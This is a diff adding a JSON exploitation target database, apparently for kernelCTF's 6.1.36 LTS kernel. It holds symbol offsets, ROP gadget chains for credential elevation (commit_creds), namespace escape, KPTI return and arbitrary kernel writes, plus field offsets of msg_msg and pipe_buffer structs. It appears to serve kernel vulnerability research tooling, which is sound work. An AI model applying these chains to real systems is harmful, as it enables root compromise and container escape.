@@ -1,0 +1,413 @@
+{
+    "meta": {
+        "symbols": [
+            {
+                "name": "__x64_sys_fork"
+            },
+            {
+                "name": "anon_pipe_buf_ops"
+            },
+            {
+                "name": "commit_creds"
+            },
+            {
+                "name": "find_task_by_vpid"
+            },
+            {
+                "name": "init_nsproxy"
+            },
+            {
+                "name": "msleep"
+            },
+            {
+                "name": "prepare_kernel_cred"
+            },
+            {
+                "name": "switch_task_namespaces"
+            }
+        ],
+        "rop_actions": [
+            {
+                "desc": "commit_kernel_cred(prepare_kernel_cred(0))",
+                "args": []
+            },
+            {
+                "desc": "fork()",
+                "args": []
+            },
+            {
+                "desc": "msleep(ARG_time_msec)",
+                "args": [
+                    {
+                        "name": "time_msec",
+                        "required": true
+                    }
+                ]
+            },
+            {
+                "desc": "ret_via_kpti_retpoline(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
+                "args": [
+                    {
+                        "name": "user_rip",
+                        "required": true
+                    },
+                    {
+                        "name": "user_cs",
+                        "required": true
+                    },
+                    {
+                        "name": "user_rflags",
+                        "required": true
+                    },
+                    {
+                        "name": "user_sp",
+                        "required": true
+                    },
+                    {
+                        "name": "user_ss",
+                        "required": true
+                    }
+                ]
+            },
+            {
+                "desc": "switch_task_namespaces(find_task_by_vpid(ARG_vpid=1), init_nsproxy)",
+                "args": [
+                    {
+                        "name": "vpid",
+                        "required": false,
+                        "default_value": 1
+                    }
+                ]
+            },
+            {
+                "desc": "telefork(ARG_sleep_msec=0xffffffff)",
+                "args": [
+                    {
+                        "name": "sleep_msec",
+                        "required": false,
+                        "default_value": 4294967295
+                    }
+                ]
+            },
+            {
+                "desc": "write_what_where_64(ARG_address, ARG_new_value)",
+                "args": [
+                    {
+                        "name": "address",
+                        "required": true
+                    },
+                    {
+                        "name": "new_value",
+                        "required": true
+                    }
+                ]
+            }
+        ],
+        "structs": [
+            {
+                "struct_name": "hfsc_class",
+                "fields": [
+                    {
+                        "field_name": "level",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "cl_parent",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "vt_node.__rb_parent_color",
+                        "optional": true
+                    },
+                    {
+                        "field_name": "cf_node.__rb_parent_color",
+                        "optional": true
+                    },
+                    {
+                        "field_name": "cl_vt",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "cl_cvtmin",
+                        "optional": false
+                    }
+                ]
+            },
+            {
+                "struct_name": "msg_msg",
+                "fields": [
+                    {
+                        "field_name": "m_list.next",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "m_list.prev",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "m_type",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "m_ts",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "next",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "security",
+                        "optional": false
+                    }
+                ]
+            },
+            {
+                "struct_name": "msg_msgseg",
+                "fields": [
+                    {
+                        "field_name": "next",
+                        "optional": false
+                    }
+                ]
+            },
+            {
+                "struct_name": "pipe_buf_operations",
+                "fields": [
+                    {
+                        "field_name": "release",
+                        "optional": false
+                    },
+                    {
+                        "field_name": "get",
+                        "optional": false
+                    }
+                ]
+            },
+            {
+                "struct_name": "pipe_buffer",
+                "fields": [
+                    {
+                        "field_name": "ops",
+                        "optional": false
+                    }
+                ]
+            }
+        ]
+    },
+    "targets": [
+        {
+            "distro": "kernelctf",
+            "release_name": "lts-6.1.36",
+            "version": "KernelCTF version 6.1.36 (...)",
+            "symbols": {
+                "__x64_sys_fork": 0,
+                "anon_pipe_buf_ops": 27381632,
+                "commit_creds": 0,
+                "find_task_by_vpid": 0,
+                "init_nsproxy": 40330688,
+                "msleep": 2265824,
+                "prepare_kernel_cred": 1830832,
+                "switch_task_namespaces": 0
+            },
+            "rop_actions": [
+                {
+                    "description": "commit_kernel_cred(prepare_kernel_cred(0))",
+                    "gadgets": [
+                        {
+                            "kernel_offset": 8682
+                        },
+                        {
+                            "value": 0
+                        },
+                        {
+                            "kernel_offset": 1830832
+                        },
+                        {
+                            "kernel_offset": 2390333
+                        },
+                        {
+                            "kernel_offset": 1830160
+                        }
+                    ]
+                },
+                {
+                    "description": "fork()",
+                    "gadgets": [
+                        {
+                            "kernel_offset": 1632512
+                        }
+                    ]
+                },
+                {
+                    "description": "msleep(ARG_time_msec)",
+                    "gadgets": [
+                        {
+                            "kernel_offset": 8682
+                        },
+                        {
+                            "argument_index": 0
+                        },
+                        {
+                            "kernel_offset": 2265824
+                        }
+                    ]
+                },
+                {
+                    "description": "ret_via_kpti_retpoline(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
+                    "gadgets": [
+                        {
+                            "kernel_offset": 18878662
+                        },
+                        {
+                            "value": 0
+                        },
+                        {
+                            "value": 0
+                        },
+                        {
+                            "argument_index": 0
+                        },
+                        {
+                            "argument_index": 1
+                        },
+                        {
+                            "argument_index": 2
+                        },
+                        {
+                            "argument_index": 3
+                        },
+                        {
+                            "argument_index": 4
+                        }
+                    ]
+                },
+                {
+                    "description": "switch_task_namespaces(find_task_by_vpid(ARG_vpid=1), init_nsproxy)",
+                    "gadgets": [
+                        {
+                            "kernel_offset": 8682
+                        },
+                        {
+                            "argument_index": 0
+                        },
+                        {
+                            "kernel_offset": 1791488
+                        },
+                        {
+                            "kernel_offset": 2390333
+                        },
+                        {
+                            "kernel_offset": 9580
+                        },
+                        {
+                            "kernel_offset": 40330688
+                        },
+                        {
+                            "kernel_offset": 1823104
+                        }
+                    ]
+                },
+                {
+                    "description": "telefork(ARG_sleep_msec=0xffffffff)",
+                    "gadgets": [
+                        {
+                            "kernel_offset": 1632512
+                        },
+                        {
+                            "kernel_offset": 8682
+                        },
+                        {
+                            "argument_index": 0
+                        },
+                        {
+                            "kernel_offset": 2265824
+                        }
+                    ]
+                },
+                {
+                    "description": "write_what_where_64(ARG_address, ARG_new_value)",
+                    "gadgets": [
+                        {
+                            "kernel_offset": 8682
+                        },
+                        {
+                            "argument_index": 0
+                        },
+                        {
+                            "kernel_offset": 9580
+                        },
+                        {
+                            "argument_index": 1
+                        },
+                        {
+                            "kernel_offset": 3091897
+                        }
+                    ]
+                }
+            ],
+            "stack_pivots": {
+                "one_gadgets": [],
+                "push_indirects": [],
+                "pop_rsps": [],
+                "stack_shifts": []
+            },
+            "structs": {
+                "msg_msg": {
+                    "size": 48,
+                    "fields": {
+                        "m_list.next": {
+                            "offset": 0,
+                            "size": 8
+                        },
+                        "m_list.prev": {
+                            "offset": 8,
+                            "size": 8
+                        },
+                        "m_type": {
+                            "offset": 16,
+                            "size": 8
+                        },
+                        "m_ts": {
+                            "offset": 24,
+                            "size": 8
+                        },
+                        "next": {
+                            "offset": 32,
+                            "size": 8
+                        },
+                        "security": {
+                            "offset": 40,
+                            "size": 8
+                        }
+                    },
+                    "meta_idx": 1
+                },
+                "pipe_buf_operations": {
+                    "size": 32,
+                    "fields": {
+                        "release": {
+                            "offset": 8,
+                            "size": 8
+                        },
+                        "get": {
+                            "offset": 24,
+                            "size": 8
+                        }
+                    },
+                    "meta_idx": 3
+                },
+                "pipe_buffer": {
+                    "size": 40,
+                    "fields": {
+                        "ops": {
+                            "offset": 16,
+                            "size": 8
+                        }
+                    },
+                    "meta_idx": 4
+                }
+            }
+        }
+    ]
+}
